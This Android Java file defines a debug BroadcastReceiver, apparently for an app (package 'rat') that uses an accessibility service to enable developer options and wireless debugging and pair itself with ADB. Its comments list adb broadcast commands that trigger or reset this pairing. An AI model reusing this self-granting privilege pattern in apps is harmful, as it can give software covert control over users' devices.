package com.vendor.rat.debug;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.vendor.rat.adb.AdbConnectionManager;
import com.vendor.rat.auto.engine.adb.WirelessPairEngine;
import com.vendor.rat.service.MyAccessibilityService;
import com.vendor.rat.utils.SecureSettingsWriter;

/**
 * Debug BroadcastReceiver — 通过 ADB 命令直接触发各种调试操作
 *
 * 用法 (保持 ADB 连接，不需要断开无线调试):
 *
 *   # 触发配对流程 (跳过心跳冷却)
 *   adb shell am broadcast -a com.vendor.rat.DEBUG_START_PAIR
 *
 *   # 重置配对状态 (清除 RSA keys + paired flag)
 *   adb shell am broadcast -a com.vendor.rat.DEBUG_RESET_PAIR
 *
 *   # 查看当前状态
 *   adb shell am broadcast -a com.vendor.rat.DEBUG_STATUS
 *
 *   # 仅测试 Phase 2 (找无线调试开关)
 *   adb shell am broadcast -a com.vendor.rat.DEBUG_OPEN_DEV_OPTIONS
 *
 * 注意: 仅在 debug build 中生效 (release build 中此 receiver 不注册)
 */
public class DebugReceiver extends BroadcastReceiver {

    private static final String TAG = "DebugReceiver";

    public static final String ACTION_START_PAIR = "com.vendor.rat.DEBUG_START_PAIR";
    public static final String ACTION_RESET_PAIR = "com.vendor.rat.DEBUG_RESET_PAIR";
    public static final String ACTION_STATUS = "com.vendor.rat.DEBUG_STATUS";
    public static final String ACTION_OPEN_DEV_OPTIONS = "com.vendor.rat.DEBUG_OPEN_DEV_OPTIONS";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || intent.getAction() == null) return;

        String action = intent.getAction();
        Log.i(TAG, "=== Debug action: " + action + " ===");

        switch (action) {
            case ACTION_START_PAIR:
                handleStartPair(context);
                break;
            case ACTION_RESET_PAIR:
                handleResetPair(context);
                break;
            case ACTION_STATUS:
                handleStatus(context);
                break;
            case ACTION_OPEN_DEV_OPTIONS:
                handleOpenDevOptions(context);
                break;
            default:
                Log.w(TAG, "Unknown debug action: " + action);
        }
    }

    private void handleStartPair(Context context) {
        MyAccessibilityService svc = MyAccessibilityService.getInstance();
        if (svc == null) {
            Log.e(TAG, "START_PAIR: 无障碍服务未运行!");
            return;
        }

        // 强制重置配对进度标志 (跳过冷却)
        Log.i(TAG, "START_PAIR: 强制触发配对流程...");
        boolean started = WirelessPairEngine.startPairing(context);
        Log.i(TAG, "START_PAIR: result=" + started);
    }

    private void handleResetPair(Context context) {
        Log.i(TAG, "RESET_PAIR: 重置配对状态...");
        AdbConnectionManager mgr = AdbConnectionManager.getInstance();
        if (mgr != null) {
            mgr.doDisconnect();
            // Reset paired flag
            mgr.resetForTesting();
            Log.i(TAG, "RESET_PAIR: AdbConnectionManager 已重置");
        }
        // Clear persisted pair state
        com.vendor.rat.adb.AdbPersistence.clearAll();
        Log.i(TAG, "RESET_PAIR: 持久化数据已清除");
    }

    private void handleStatus(Context context) {
        StringBuilder sb = new StringBuilder();
        sb.append("\n========== DEBUG STATUS ==========\n");

        // Accessibility
        MyAccessibilityService svc = MyAccessibilityService.getInstance();
        sb.append("无障碍服务: ").append(svc != null ? "✅ 运行中" : "❌ 未运行").append("\n");

        // ADB
        AdbConnectionManager mgr = AdbConnectionManager.getInstance();
        if (mgr != null) {
            sb.append("ADB 初始化: ✅\n");
            sb.append("ADB 已配对: ").append(mgr.isPaired() ? "✅" : "❌").append("\n");
            sb.append("ADB 已连接: ").append(mgr.isAdbConnected() ? "✅" : "❌").append("\n");
        } else {
            sb.append("ADB 初始化: ❌ (AdbConnectionManager is null)\n");
        }

        // Settings
        sb.append("开发者选项: ").append(
            SecureSettingsWriter.isDeveloperOptionsEnabled(context) ? "✅" : "❌").append("\n");
        sb.append("无线调试: ").append(
            SecureSettingsWriter.isWifiDebugEnabled(context) ? "✅" : "❌").append("\n");

        // Pairing engine
        sb.append("配对引擎: ").append(
            WirelessPairEngine.isPairingInProgress() ? "🔄 运行中" : "⏹ 空闲").append("\n");

        sb.append("==================================\n");
        Log.i(TAG, sb.toString());
    }

    private void handleOpenDevOptions(Context context) {
        try {
            Intent intent = new Intent("android.settings.APPLICATION_DEVELOPMENT_SETTINGS");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            Log.i(TAG, "OPEN_DEV_OPTIONS: 已打开开发者选项");
        } catch (Exception e) {
            Log.e(TAG, "OPEN_DEV_OPTIONS: 失败", e);
        }
    }
}
